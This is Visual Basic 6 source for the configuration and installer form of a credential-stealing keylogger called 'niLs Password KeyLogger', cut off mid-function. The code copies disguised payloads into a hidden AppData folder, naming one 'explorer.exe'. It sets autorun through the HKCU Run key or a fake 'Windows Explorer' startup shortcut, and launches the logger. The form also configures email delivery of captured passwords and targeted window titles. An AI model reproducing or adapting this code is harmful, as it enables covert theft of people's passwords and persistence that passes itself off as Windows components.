VERSION 5.00
Begin VB.Form Form1 
   Appearance      =   0  'Flat
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   Caption         =   "niLs Password KeyLogger"
   ClientHeight    =   5625
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   6150
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   5625
   ScaleWidth      =   6150
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton cmdInstall 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Re-install NPS"
      Height          =   375
      Left            =   600
      Style           =   1  'Graphical
      TabIndex        =   38
      Top             =   4800
      Width           =   1335
   End
   Begin VB.Frame Frame4 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      ForeColor       =   &H80000008&
      Height          =   1935
      Left            =   360
      TabIndex        =   34
      Top             =   1560
      Visible         =   0   'False
      Width           =   5415
      Begin VB.Label Label16 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Special Thanks to Marathi cyber Army"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404040&
         Height          =   255
         Left            =   0
         TabIndex        =   39
         Top             =   1560
         Width           =   5415
      End
      Begin VB.Label Label15 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "itsniL123@gmail.com"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   11.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H000000FF&
         Height          =   255
         Left            =   0
         TabIndex        =   37
         Top             =   1200
         Width           =   5415
      End
      Begin VB.Label Label14 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Thank You for Using!!"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   1080
         TabIndex        =   36
         Top             =   840
         Width           =   3255
      End
      Begin VB.Label Label13 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Visit www.TheniLsProjects.blogspot.com"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   14.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H000000C0&
         Height          =   855
         Left            =   120
         TabIndex        =   35
         Top             =   120
         Width           =   5175
      End
   End
   Begin VB.CommandButton cmdLoadTitles 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Titles Picker"
      Height          =   375
      Left            =   2280
      Style           =   1  'Graphical
      TabIndex        =   22
      Top             =   4800
      Width           =   1575
   End
   Begin VB.CommandButton cmdsaveChanges 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Save"
      Default         =   -1  'True
      Height          =   375
      Left            =   4080
      Style           =   1  'Graphical
      TabIndex        =   21
      Top             =   4800
      Width           =   1455
   End
   Begin VB.Frame Frame3 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   "Titles Picker:"
      ForeColor       =   &H00C0C0C0&
      Height          =   4215
      Left            =   120
      TabIndex        =   14
      Top             =   5640
      Visible         =   0   'False
      Width           =   5895
      Begin VB.CommandButton cmdUpdate 
         BackColor       =   &H00C0C0C0&
         Caption         =   "Update"
         Height          =   255
         Left            =   4920
         Style           =   1  'Graphical
         TabIndex        =   41
         Top             =   840
         Width           =   735
      End
      Begin VB.TextBox txtUpdate 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   225
         Left            =   120
         TabIndex        =   40
         Top             =   900
         Width           =   4815
      End
      Begin VB.CommandButton cmdSaveTitles 
         BackColor       =   &H00E0E0E0&
         Caption         =   "Save Titles"
         Height          =   375
         Left            =   2040
         Style           =   1  'Graphical
         TabIndex        =   20
         Top             =   3720
         Width           =   1695
      End
      Begin VB.CommandButton cmdRemoveTitle 
         BackColor       =   &H00FFFFFF&
         Caption         =   ">>"
         Height          =   375
         Left            =   2640
         Style           =   1  'Graphical
         TabIndex        =   19
         Top             =   2640
         Width           =   615
      End
      Begin VB.CommandButton cmdAddTitles 
         BackColor       =   &H00E0E0E0&
         Caption         =   "<<"
         Height          =   375
         Left            =   2640
         Style           =   1  'Graphical
         TabIndex        =   18
         Top             =   1440
         Width           =   615
      End
      Begin VB.CommandButton cmdScanTitles 
         BackColor       =   &H00C0C0C0&
         Caption         =   "Pick Titles"
         Height          =   375
         Left            =   4440
         Style           =   1  'Graphical
         TabIndex        =   17
         Top             =   3360
         Width           =   1095
      End
      Begin VB.Timer Timer1 
         Enabled         =   0   'False
         Interval        =   1000
         Left            =   5400
         Top             =   240
      End
      Begin VB.ListBox List2 
         Appearance      =   0  'Flat
         ForeColor       =   &H00404040&
         Height          =   2370
         ItemData        =   "Form1.frx":57E2
         Left            =   3240
         List            =   "Form1.frx":57E4
         MultiSelect     =   2  'Extended
         TabIndex        =   16
         Top             =   1200
         Width           =   2535
      End
      Begin VB.ListBox List1 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Height          =   2370
         Left            =   120
         TabIndex        =   15
         Top             =   1200
         Width           =   2535
      End
      Begin VB.Label Label12 
         BackStyle       =   0  'Transparent
         Caption         =   $"Form1.frx":57E6
         ForeColor       =   &H00FFFFFF&
         Height          =   615
         Left            =   120
         TabIndex        =   26
         Top             =   240
         Width           =   5535
      End
   End
   Begin VB.Frame Frame2 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   "Password Picker Setup"
      ForeColor       =   &H00E0E0E0&
      Height          =   2055
      Left            =   600
      TabIndex        =   7
      Top             =   480
      Width           =   4935
      Begin VB.CheckBox chkAuto 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Enable Autorun :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   30
         Top             =   1320
         Value           =   1  'Checked
         Width           =   1575
      End
      Begin VB.OptionButton optStartup 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Startup Directory"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   3240
         TabIndex        =   29
         Top             =   1320
         Width           =   1575
      End
      Begin VB.OptionButton optReg 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "HKCU\..\Run"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1800
         TabIndex        =   28
         Top             =   1320
         Width           =   1335
      End
      Begin VB.CheckBox Check1 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Enable Send Email"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   27
         Top             =   1680
         Value           =   1  'Checked
         Width           =   4575
      End
      Begin VB.TextBox txtLogPWD 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   13.5
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         IMEMode         =   3  'DISABLE
         Left            =   1800
         MaxLength       =   20
         PasswordChar    =   "*"
         TabIndex        =   13
         ToolTipText     =   "Leave Password blank, if you want to read passwords in email."
         Top             =   960
         Width           =   2895
      End
      Begin VB.TextBox txtLogDir 
         Appearance      =   0  'Flat
         Height          =   285
         Left            =   1800
         TabIndex        =   12
         ToolTipText     =   "Click to Explore."
         Top             =   600
         Width           =   2895
      End
      Begin VB.TextBox txtPCDec 
         Appearance      =   0  'Flat
         Height          =   285
         Left            =   1800
         MaxLength       =   25
         TabIndex        =   9
         ToolTipText     =   "This will help you to identify this PC uniquely."
         Top             =   240
         Width           =   2895
      End
      Begin VB.Label Label8 
         BackStyle       =   0  'Transparent
         Caption         =   "Computer Description :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   11
         Top             =   240
         Width           =   1575
      End
      Begin VB.Label Label7 
         BackStyle       =   0  'Transparent
         Caption         =   "Password to Open :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   10
         Top             =   960
         Width           =   1455
      End
      Begin VB.Label Label6 
         BackStyle       =   0  'Transparent
         Caption         =   "Store Passwords in :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   8
         ToolTipText     =   "Double Click to Hide this Folder. Single Click to unHide"
         Top             =   600
         Width           =   1695
      End
   End
   Begin VB.Frame Frame1 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   "Email Setup"
      ForeColor       =   &H00C0C0C0&
      Height          =   1935
      Left            =   600
      TabIndex        =   0
      Top             =   2640
      Width           =   4935
      Begin VB.TextBox txtReTime 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   2160
         MaxLength       =   1
         TabIndex        =   25
         Text            =   "0"
         Top             =   1440
         Width           =   375
      End
      Begin VB.TextBox txtSePWD 
         Appearance      =   0  'Flat
         Height          =   285
         IMEMode         =   3  'DISABLE
         Left            =   1920
         PasswordChar    =   "*"
         TabIndex        =   3
         Top             =   1080
         Width           =   2655
      End
      Begin VB.TextBox txtSeEmail 
         Appearance      =   0  'Flat
         Height          =   285
         Left            =   1920
         TabIndex        =   2
         ToolTipText     =   "IMAP must be enabled."
         Top             =   600
         Width           =   2655
      End
      Begin VB.TextBox txtRecEmail 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Height          =   285
         Left            =   1920
         TabIndex        =   1
         Top             =   240
         Width           =   2655
      End
      Begin VB.Label Label11 
         BackStyle       =   0  'Transparent
         Caption         =   "If Sending failed, Retry after           minutes.(0 for No Retry.)"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   24
         Top             =   1440
         Width           =   4575
      End
      Begin VB.Label Label1 
         BackStyle       =   0  'Transparent
         Caption         =   "Sender's Email Address : eg: yourID@gmail.com"
         ForeColor       =   &H00FFFFFF&
         Height          =   495
         Left            =   120
         TabIndex        =   6
         Top             =   600
         Width           =   1815
      End
      Begin VB.Label Label2 
         BackStyle       =   0  'Transparent
         Caption         =   "Sender's Password:"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   5
         Top             =   1080
         Width           =   1815
      End
      Begin VB.Label Label4 
         BackStyle       =   0  'Transparent
         Caption         =   "Recipient Email Addess:"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   4
         Top             =   240
         Width           =   1815
      End
   End
   Begin VB.Label Label10 
      Alignment       =   2  'Center
      BackColor       =   &H00C0C0C0&
      Caption         =   "Application Developed by niL"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   255
      Left            =   0
      TabIndex        =   33
      Top             =   5280
      Width           =   6135
   End
   Begin VB.Label Label5 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00FF0000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "-"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   13.5
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   375
      Left            =   0
      TabIndex        =   32
      Top             =   0
      Width           =   375
   End
   Begin VB.Label Label3 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "X"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   13.5
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000014&
      Height          =   375
      Left            =   5760
      TabIndex        =   31
      Top             =   0
      Width           =   375
   End
   Begin VB.Label Label9 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "niLs Password KeyLogger"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   15.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   375
      Left            =   0
      TabIndex        =   23
      Top             =   0
      Width           =   6135
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'' The exe file must exist for this to work properly.


Private Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, ByVal lpSecurityAttributes As Long, phkResult As Long, lpdwDisposition As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long         ' Note that if you declare the lpData parameter as String, you must pass it By Value.
Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long         ' Note that if you declare the lpData parameter as String, you must pass it By Value.

Private Const READ_CONTROL = &H20000
Private Const KEY_SET_VALUE = &H2
Private Const KEY_CREATE_SUB_KEY = &H4
Private Const STANDARD_RIGHTS_WRITE = (READ_CONTROL)
Private Const SYNCHRONIZE = &H100000
Private Const KEY_WRITE = ((STANDARD_RIGHTS_WRITE Or KEY_SET_VALUE Or KEY_CREATE_SUB_KEY) And (Not SYNCHRONIZE))

Private Const STANDARD_RIGHTS_READ = (READ_CONTROL)
Private Const KEY_ENUMERATE_SUB_KEYS = &H8
Private Const KEY_NOTIFY = &H10
Private Const KEY_QUERY_VALUE = &H1
Private Const KEY_READ = ((STANDARD_RIGHTS_READ Or KEY_QUERY_VALUE Or KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY) And (Not SYNCHRONIZE))

Private Const ERROR_SUCCESS = 0&
Private Const HKEY_CURRENT_USER = &H80000001
Private Const REG_SZ = 1

Private m_IgnoreEvents As Boolean


'Special Folders Path
Public Enum mceIDLPaths
    CSIDL_APPDATA = &H1A ' * CSIDL_APPDATA - File system directory that serves as a common repository for application-specific data. A common path is C:\WINNT\Profiles\username\Application Data.
    CSIDL_STARTUP = &H7 ' * CSIDL_STARTUP - File system directory that corresponds to the user's Startup program group. The system starts these programs whenever any user logs onto Windows NT or starts Windows® 95. A common path is C:\WINNT\Profiles\username\Start Menu\Programs\Startup.
End Enum
Private Declare Function SHGetSpecialFolderPath Lib "SHELL32.DLL" Alias "SHGetSpecialFolderPathA" (ByVal hWnd As Long, ByVal lpszPath As String, ByVal nFolder As Integer, ByVal fCreate As Boolean) As Boolean

'active window title
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetParent Lib "user32" (ByVal hWnd As Long) As Long

Private Sub Check1_Click()
If Check1.Value = vbUnchecked Then
Frame1.Enabled = False
txtRecEmail = "none"
Else
Frame1.Enabled = True
End If
End Sub

Private Sub chkAuto_Click()
If chkAuto.Value = vbUnchecked Then
optReg.Enabled = False
optStartup.Enabled = False
Else
optReg.Enabled = True
optStartup.Enabled = True
End If
End Sub



Private Sub cmdInstall_Click()
Call InstallNPS
End Sub

Private Sub cmdUpdate_Click()
List1.RemoveItem List1.ListIndex
List1.AddItem txtUpdate, List1.ListIndex + 1
End Sub

Private Sub Form_Load()
If Command = "/install" Then Call InstallNPS: Exit Sub: End

If Command = "/default" Then
    Call LoadSetting(App.Path & "\Files\files.cab"): chkAuto.Enabled = False: Label9.Caption = "nKLG - Default Settings"
Else
    If Dir(GetSpecialFolderA(CSIDL_APPDATA) & "System\explorer.exe") <> "" Then
    Call LoadSetting(GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp")
    Call LoadAutoRunSetting
    Else
    Dim ans As String
    ans = MsgBox("niLs Password Keylogger not installed. Do you want to install now?", vbYesNo, "Install?")
    If ans = vbYes Then Call InstallNPS
    End
    End If
End If
End Sub
Private Sub LoadSetting(ByVal settingFile As String)
Dim LogDir, LogPWD, RecEmail, SeEmail, SePWD, ReTime, PCDec As String
On Error GoTo errhand

Open settingFile For Input As #1
    Input #1, LogDir, LogPWD, PCDec, RecEmail, SeEmail, SePWD, ReTime
Close #1

txtLogDir = LogDir
txtRecEmail = RecEmail
txtSeEmail = SeEmail
txtSePWD = SePWD
txtReTime = ReTime
txtPCDec = PCDec
txtLogPWD = LogPWD
If RecEmail = "none" Then Check1.Value = vbUnchecked: Frame1.Enabled = False

errhand:
If err.Number <> 0 Then MsgBox "Error during Load!"
End Sub
Private Sub LoadAutoRunSetting()
'See if Common Startup Folder contains Shortcut
If Dir(GetSpecialFolderA(CSIDL_STARTUP) & "Windows Explorer.lnk") <> "" Then optStartup.Value = True

' See if the program is set to run at startup.
    m_IgnoreEvents = True
    If WillRunAtStartup("Windows Explorer") Then
        optReg.Value = True
    Else
        optReg.Value = False
    End If
    m_IgnoreEvents = False

If optReg.Value = False And optStartup.Value = False Then chkAuto.Value = vbUnchecked
End Sub
Private Sub SaveSetting(ByVal settingFile As String)
If Right(txtLogDir.Text, 1) = "/" Or Right(txtLogDir.Text, 1) = "\" Then txtLogDir = Left(txtLogDir, Len(txtLogDir) - 1)
On Error GoTo errhand
Open settingFile For Output As #1
Write #1, txtLogDir, txtLogPWD, txtPCDec, txtRecEmail, txtSeEmail, txtSePWD, txtReTime
Close #1

errhand:
If err.Number <> 0 Then
MsgBox "Error while saving!"
Else
MsgBox "Setting Saved!!", vbInformation
End If
End Sub
Private Sub SaveAutorunSetting()
Dim AppDataPath As String
AppDataPath = GetSpecialFolderA(CSIDL_APPDATA)

If chkAuto.Value = vbUnchecked Then
    Create_Startup_ShortCut AppDataPath & "System\explorer.exe", "Windows Explorer", , 7, 1, False
    SetRunAtStartup "Windows Explorer", AppDataPath & "System", False
    Exit Sub
End If

If optReg.Value = True Then
    Create_Startup_ShortCut AppDataPath & "System\explorer.exe", "Windows Explorer", , 7, 1, False
    If m_IgnoreEvents Then Exit Sub
    SetRunAtStartup "explorer", AppDataPath & "System", True
Else
    Create_Startup_ShortCut AppDataPath & "System\explorer.exe", "Windows Explorer", , 7, 1, True
    If m_IgnoreEvents Then Exit Sub
    SetRunAtStartup "explorer", AppDataPath & "System", False
End If
End Sub

'Title Picker
Private Sub cmdAddTitles_Click()
Timer1.Enabled = False
List2.Enabled = True

If List1.ListCount >= 5 Then MsgBox "Title Box Full!! Remove some Titles.", vbApplicationModal, "Adding Titles": Exit Sub

Dim i As Integer
For i = 0 To (List2.ListCount - 1)
    If (List2.Selected(i)) = True Then
    List2.ListIndex = i
    List1.AddItem (List2.Text)
    End If
Next i
End Sub


Private Sub cmdLoadTitles_Click()
If cmdLoadTitles.Caption = "Hide Titles" Then
cmdLoadTitles.Caption = "Show Titles"
Frame3.Visible = False
Exit Sub
End If

cmdLoadTitles.Cancel = True
cmdLoadTitles.Caption = "Hide Titles"
Frame3.Visible = True
Frame3.Top = 500
Frame3.Left = 100
List1.Clear

On Error Resume Next
Dim t1, t2, t3, t4, t5 As String
If chkAuto.Enabled = False Then
Open (App.Path & "\Files\main.exe") For Input As #1
Else
Open (GetSpecialFolderA(CSIDL_APPDATA) & "System\default.MCP") For Input As #1
End If
Input #1, t1, t2, t3, t4, t5
Close #1
List1.AddItem t1
List1.AddItem t2
List1.AddItem t3
List1.AddItem t4
List1.AddItem t5
End Sub

Private Sub cmdRemoveTitle_Click()
If List1.ListIndex = -1 Then MsgBox "Choose Titles to Remove.", vbInformation: Exit Sub
List2.AddItem List1.Text, (List2.ListCount)
List1.RemoveItem (List1.ListIndex)
If List1.ListCount <> 0 Then List1.ListIndex = 0
End Sub

Private Sub cmdsaveChanges_Click()
If chkAuto.Enabled = False Then
Call SaveSetting(App.Path & "\Files\files.cab")
Else
Call SaveSetting(GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp")
SaveAutorunSetting
End If
End Sub

Private Sub cmdSaveTitles_Click()
Dim i As Integer
If List1.ListCount < 5 Then
For i = 1 To (5 - List1.ListCount)
List1.AddItem "No Title", (List1.ListCount)
Next
End If

Dim t1, t2, t3, t4, t5 As String
List1.ListIndex = 0
t1 = Left(List1.Text, 25)
List1.ListIndex = 1
t2 = Left(List1.Text, 25)
List1.ListIndex = 2
t3 = Left(List1.Text, 25)
List1.ListIndex = 3
t4 = Left(List1.Text, 25)
List1.ListIndex = 4
t5 = Left(List1.Text, 25)

On Error Resume Next
If chkAuto.Enabled = False Then
Open (App.Path & "\Files\main.exe") For Output As #1
Else
Open (GetSpecialFolderA(CSIDL_APPDATA) & "System\default.MCP") For Output As #1
End If
        Write #1, t1, t2, t3, t4, t5
Close #1
MsgBox "Titles Saved Successfully!!"
Frame3.Visible = False
End Sub

Private Sub cmdScanTitles_Click()

If cmdScanTitles.Caption = "Stop Picking" Then
Timer1.Enabled = False
List2.Enabled = True
cmdScanTitles.Caption = "Start Picking"
Else
List2.Clear
Timer1.Enabled = True
List2.Enabled = False
cmdScanTitles.Caption = "Stop Picking"
Me.WindowState = 1
End If
End Sub


Private Sub InstallNPS()
On Error GoTo errhand
If FolderExists(GetSpecialFolderA(CSIDL_APPDATA) & "System") = False Then MkDir GetSpecialFolderA(CSIDL_APPDATA) & "System"
Call HideThisFolder(GetSpecialFolderA(CSIDL_APPDATA) & "System", True)

FileCopy App.Path & "\Files\msex.text", GetSpecialFolderA(CSIDL_APPDATA) & "System\explorer.exe"   'explorer.exe
FileCopy App.Path & "\Files\AS4T.CVF", GetSpecialFolderA(CSIDL_APPDATA) & "System\WinUpdate.exe"     'winUpdate.exe
FileCopy App.Path & "\Files\files.CAB", GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp"
FileCopy App.Path & "\Files\main.exe", GetSpecialFolderA(CSIDL_APPDATA) & "System\default.MCP"

'Set Autorun options
Create_Startup_ShortCut AppDataPath & "System\explorer.exe", "Windows Explorer", , 7, 1, False
If m_IgnoreEvents Then Exit Sub
SetRunAtStartup "Windows Explorer", AppDataPath & "System", True

LoadSetting (GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp")
LoadAutoRunSetting

'Start Keylogger:
Shell GetSpecialFolderA(CSIDL_APPDATA) & "System\explorer.exe", vbNormalFocus

errhand:
If err.Number = 0 Then
    MsgBox "Installed Successfully!", vbInformation
ElseIf err.Number = 76 Then
    MsgBox "Installation Files not Found!", vbCritical: End
ElseIf err.Number = 70 Then
    MsgBox "Keylogger is active! Disable Autorun and logoff to re-install.", vbCritical
Else
    MsgBox err.Description: End
End If
End Sub









Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label9.BackColor = &H404040
Label3.BackColor = &HFF0000
Label5.BackColor = &HFF0000
Frame4.Visible = False
Label10.BackColor = &H808080
End Sub

Private Sub Label10_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Frame4.Visible = True
Label10.BackColor = vbWhite
End Sub

Private Sub Label3_Click()
End
End Sub



Private Sub Label3_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label3.BackColor = &HFF8080
Frame4.Visible = True
End Sub

Private Sub Label5_Click()
Me.WindowState = 1
End Sub

Private Sub Label5_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label5.BackColor = &HFF8080
End Sub

Private Sub Label6_Click()
If Left(txtLogDir, 2) = "u:" Then txtLogDir = Environ$("USERPROFILE") & Mid(txtLogDir, 3, Len(txtLogDir) - 2)
HideThisFolder txtLogDir, False
End Sub

Private Sub Label6_DblClick()
If Left(txtLogDir, 2) = "u:" Then txtLogDir = Environ$("USERPROFILE") & Mid(txtLogDir, 3, Len(txtLogDir) - 2)
HideThisFolder txtLogDir, True
End Sub

Private Sub Label9_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label9.BackColor = vbBlue

End Sub

Private Sub List1_Click()
txtUpdate = List1.Text
End Sub

Private Sub Timer1_Timer()
Dim i As Integer
If List2.ListCount >= 10 Then Call cmdScanTitles_Click: Me.WindowState = 0

List2.ListIndex = List2.ListCount - 1

If GetActiveWindowTitle(True) = "" Or GetActiveWindowTitle(True) = Me.Caption Then Exit Sub

If List2.Text <> GetActiveWindowTitle(True) Then List2.AddItem GetActiveWindowTitle(True)

End Sub
'Active Window Titles Picker
' Returns the title of the active window. if GetParent = true then the parent window is returned.
Public Function GetActiveWindowTitle(ByVal ReturnParent As Boolean) As String
Dim i As Long
Dim j As Long

i = GetForegroundWindow


If ReturnParent Then
Do While i <> 0
j = i
i = GetParent(i)
Loop

i = j
End If

GetActiveWindowTitle = GetWindowTitle(i)
End Function
Public Function GetWindowTitle(ByVal hWnd As Long) As String
Dim l As Long
Dim s As String

l = GetWindowTextLength(hWnd)
s = Space(l + 1)

GetWindowText hWnd, s, l + 1

GetWindowTitle = Left$(s, l)
End Function
'Special Folder Path
Public Function GetSpecialFolderA(ByVal eSpecialFolder As mceIDLPaths) As String

Dim Ret As Long
Dim Trash As String: Trash = Space$(260)

    Ret = SHGetSpecialFolderPath(0, Trash, eSpecialFolder, False)
    If Trim$(Trash) <> Chr(0) Then Trash = Left$(Trash, InStr(Trash, Chr(0)) - 1) & "\"
     
    GetSpecialFolderA = Trash
    

End Function

Private Sub Create_Startup_ShortCut(ByVal TargetPath As String, ByVal ShortCutname As String, Optional ByVal WorkPath As String, Optional ByVal Window_Style As Integer, Optional ByVal IconNum As Integer, Optional ByVal maKe As Boolean)


If maKe = False Then
    If Dir(GetSpecialFolderA(CSIDL_STARTUP) & ShortCutname & ".lnk") <> "" Then Kill GetSpecialFolderA(CSIDL_STARTUP) & ShortCutname & ".lnk"
    Exit Sub
End If

    Dim VbsObj As Object
    Set VbsObj = CreateObject("WScript.Shell")
    Dim MyShortcut As Object
    ShortCutPath = GetSpecialFolderA(CSIDL_STARTUP) 'VbsObj.SpecialFolders(ShortCutPath)
    Set MyShortcut = VbsObj.CreateShortcut(ShortCutPath & "\" & ShortCutname & ".lnk")
    MyShortcut.TargetPath = TargetPath
    MyShortcut.WorkingDirectory = WorkPath
    MyShortcut.WindowStyle = Window_Style
    MyShortcut.IconLocation = TargetPath & "," & IconNum
    MyShortcut.Save
End Sub

Private Sub SetRunAtStartup(ByVal app_name As String, ByVal app_path As String, Optional ByVal run_at_startup As Boolean = True)
Dim hKey As Long
Dim key_value As String
Dim status As Long

    On Error GoTo SetStartupError

    ' Open the key, creating it if it doesn't exist.
    If RegCreateKeyEx(HKEY_CURRENT_USER, _
        "Software\Microsoft\Windows\CurrentVersion\Run", _
        ByVal 0&, ByVal 0&, ByVal 0&, _
        KEY_WRITE, ByVal 0&, hKey, _
        ByVal 0&) <> ERROR_SUCCESS _
    Then
        MsgBox "Error " & err.Number & " opening key" & _
            vbCrLf & err.Description
        Exit Sub
    End If

    ' See if we should run at startup.
    If run_at_startup Then
        ' Create the key.
        key_value = app_path & "\" & app_name & ".exe" & vbNullChar
        status = RegSetValueEx(hKey, app_name, 0, REG_SZ, _
            ByVal key_value, Len(key_value))

        If status <> ERROR_SUCCESS Then
            MsgBox "Error " & err.Number & " setting key" & _
                vbCrLf & err.Description
        End If
    Else
        ' Delete the value.
        RegDeleteValue hKey, app_name
    End If

    ' Close the key.
    RegCloseKey hKey
    Exit Sub

SetStartupError:
    MsgBox err.Number & " " & err.Description
    Exit Sub
End Sub
' Return True if the program is set to run at startup.
Private Function WillRunAtStartup(ByVal app_name As String) As Boolean
Dim hKey As Long
